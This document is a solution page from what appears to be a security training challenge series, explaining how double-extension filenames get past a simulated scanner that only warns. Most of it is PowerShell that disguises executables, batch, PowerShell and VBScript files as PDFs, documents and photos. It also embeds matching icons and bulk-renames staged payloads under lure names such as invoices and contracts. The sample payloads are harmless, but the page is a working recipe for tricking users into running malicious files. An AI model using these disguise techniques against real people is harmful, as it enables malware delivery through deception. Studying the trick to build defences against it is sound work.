---
title: "Solution 24: Double Extension (Social Engineering + Scanner Confusion)"
challenge_number: 24
difficulty: easy
category: "Extension Heuristic Bypass"
permalink: /solutions/24-double-extension/
---

# Solution: Double Extension (Social Engineering + Scanner Confusion)

[Back to Challenge](../challenges/24-double-extension.md)

## Overview

By naming a file with two extensions (e.g., `report.pdf.exe`), the scanner sees only the **last** extension and merely warns. Meanwhile, Windows Explorer with default settings ("Hide extensions for known file types") displays the file as `report.pdf`, tricking users into opening an executable they believe is a document.

## Working Code

### Creating Double-Extension Files

```powershell
# Executable disguised as PDF
Copy-Item ".\payload.exe" -Destination ".\quarterly_report.pdf.exe"

# Batch file disguised as text
@"
@echo off
echo Payload executed
whoami > %TEMP%\proof.txt
"@ | Set-Content ".\readme.txt.bat"

# PowerShell script disguised as Word document
@'
Write-Host "Executing hidden PowerShell payload"
Get-Process | Out-File "$env:TEMP\exfil.txt"
'@ | Set-Content ".\meeting_notes.docx.ps1"

# VBScript disguised as JPEG
@"
MsgBox "Photo viewer encountered an error", vbCritical, "Error"
CreateObject("WScript.Shell").Run "calc.exe"
"@ | Set-Content ".\vacation_photo.jpg.vbs"

# Screensaver disguised as MP3
Copy-Item ".\payload.exe" -Destination ".\song.mp3.scr"
```

### Matching Icons for Believability

```powershell
# Use Resource Hacker or rcedit to embed a PDF icon into the EXE
# This makes it look like a real PDF in Explorer

# Using rcedit (Node.js tool):
# rcedit "quarterly_report.pdf.exe" --set-icon "pdf_icon.ico"

# Or compile with an embedded icon resource (C/C++):
# In your .rc file:
# 1 ICON "pdf_icon.ico"
```

### What Users See in Explorer

```
Default Explorer Settings ("Hide extensions for known file types" = ON):

  quarterly_report.pdf        <-- User sees this (looks like a PDF)
  readme.txt                  <-- User sees this (looks like text)
  vacation_photo.jpg          <-- User sees this (looks like image)

Actual filenames:
  quarterly_report.pdf.exe    <-- Actually an executable
  readme.txt.bat              <-- Actually a batch script
  vacation_photo.jpg.vbs      <-- Actually a VBScript
```

### Automation: Bulk Rename

```powershell
# Rename multiple payloads with innocent-looking double extensions
$disguises = @(
    @{ Source = "stage1.exe"; Target = "invoice_2024.pdf.exe" },
    @{ Source = "stage2.bat"; Target = "setup_instructions.txt.bat" },
    @{ Source = "stage3.ps1"; Target = "photo_backup.png.ps1" },
    @{ Source = "stage4.vbs"; Target = "contract_final.docx.vbs" }
)

foreach ($item in $disguises) {
    Copy-Item $item.Source -Destination $item.Target
    Write-Host "Created: $($item.Target)"
}
```

### Triple Extension (Extra Obfuscation)

```powershell
# Triple extension adds more confusion
Copy-Item ".\payload.exe" -Destination ".\report.2024.pdf.exe"
# Explorer shows: report.2024.pdf
# Scanner checks: .exe (warns but doesn't block)
```

## Why It Works

The scanner uses `rfind('.')` which finds the **last** dot in the filename:

```
Filename: "report.pdf.exe"
rfind('.') returns position 10 (the dot before "exe")
Extension extracted: "exe"
Result: WARN (but never block)
```

The key insights:

1. **Scanner only warns, never blocks**: Even when it correctly identifies `.exe`, the extension check is advisory only. The file is still allowed through.

2. **Social engineering layer**: The double extension exploits Windows Explorer's default behavior of hiding the last known extension. Users see `report.pdf` and double-click it, expecting Adobe Reader. Instead, Windows launches it as an executable.

3. **The first extension is irrelevant to the OS**: Windows determines file type by the **final** extension. `report.pdf.exe` is an EXE, period. The `.pdf` in the middle is just part of the filename stem.

4. **No scanner bypass needed for execution**: Since the extension check only warns, the file passes scanning and then tricks the user into executing it voluntarily.

## How to Verify

1. Create a double-extension test file:
   ```powershell
   @"
   @echo off
   echo EXECUTED > "%TEMP%\double_ext_proof.txt"
   echo Payload ran successfully
   "@ | Set-Content ".\document.pdf.bat"
   ```

2. Run the scanner:
   ```
   nim_antimalware_sim.exe document.pdf.bat
   ```

3. Expected result: Scanner issues a **warning** for `.bat` but **does not block** the file. The file passes through.

4. Verify Explorer behavior:
   ```powershell
   # Check if "Hide extensions" is enabled (default on most Windows installs)
   Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideFileExt
   # Value 1 = extensions hidden (vulnerable to double-extension trick)
   ```

5. Execute the file to confirm it runs:
   ```powershell
   cmd /c ".\document.pdf.bat"
   # Output: Payload ran successfully
   Get-Content "$env:TEMP\double_ext_proof.txt"
   # Output: EXECUTED
   ```
